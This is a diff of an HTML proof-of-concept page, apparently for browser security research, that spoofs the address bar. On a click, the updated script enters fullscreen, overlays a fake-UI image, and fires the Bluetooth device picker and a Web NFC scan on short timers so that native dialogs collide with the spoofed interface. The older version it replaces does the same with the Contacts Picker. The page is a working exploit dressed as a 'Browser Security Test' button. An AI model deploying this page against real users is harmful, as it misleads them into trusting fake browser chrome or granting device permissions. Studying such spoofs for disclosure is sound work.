@@ -1,38 +1,105 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
+<head>
+    <title>Security Research - Multi-API UI Spoof</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }         
+        #spoof {
+            width: 100%;
+            height: 100%;
+            display: none;
+            object-fit: cover; /* Memastikan gambar menutupi seluruh layar */
+        }
+        #content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+        }
+        .btn-trigger {
+            padding: 15px 40px;
+            font-size: 20px;
+            color: white;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>  
+<body>
+    <!-- Gambar yang meniru UI sistem atau Omnibox palsu -->
+    <img id="spoof" src="spoof.png.jpeg" alt="Spoofed Interface">
+
+    <div id="content">
+        <h1>Browser Security Test</h1>
+        <p>Klik tombol di bawah untuk menguji persistensi dialog sistem di atas mode fullscreen.</p>
+        <br>
+        <button class="btn-trigger">Start Security Test</button>
+    </div>
+
+    <script>
+        async function triggerExploit() {
+            const spoofImg = document.getElementById("spoof");
+            const mainContent = document.getElementById("content");
+            const elem = document.documentElement;
+
+            // 1. Masuk ke mode Fullscreen segera setelah klik
+            try {
+                if (elem.requestFullscreen) {
+                    await elem.requestFullscreen();
+                }
+            } catch (err) {
+                console.error("Fullscreen diblokir:", err);
             }
-        </style>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    await navigator.contacts.select(["name"], {});
-                })();
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";
-                document.documentElement.requestFullscreen();
-            }
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="spoof.png.jpeg"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Click anywhere on the page to spoof the omnibox!</h1>
-            </center>
-        </div>
-    </body>
-  </body>
+
+            // 2. Ganti konten dengan gambar spoof
+            mainContent.style.display = "none";
+            spoofImg.style.display = "block";
+
+            // 3. Memicu Bluetooth Device Picker (Native Dialog)
+            // Menggunakan delay kecil untuk menciptakan tabrakan visual (race condition)
+            setTimeout(async () => {
+                try {
+                    await navigator.bluetooth.requestDevice({
+                        acceptAllDevices: true
+                    });
+                } catch (e) {
+                    console.log("Bluetooth dialog dismissed");
+                }
+            }, 300);
+
+            // 4. Memicu Web NFC (Hanya untuk Chrome Android)
+            setTimeout(async () => {
+                try {
+                    if ('NDEFReader' in window) {
+                        const ndef = new NDEFReader();
+                        await ndef.scan();
+                    }
+                } catch (e) {
+                    console.log("NFC scanning error/unsupported");
+                }
+            }, 500);
+        }
+
+        // Listener untuk interaksi pengguna
+        window.onclick = () => {
+            triggerExploit();
+        };
+    </script>
+</body>
 </html>
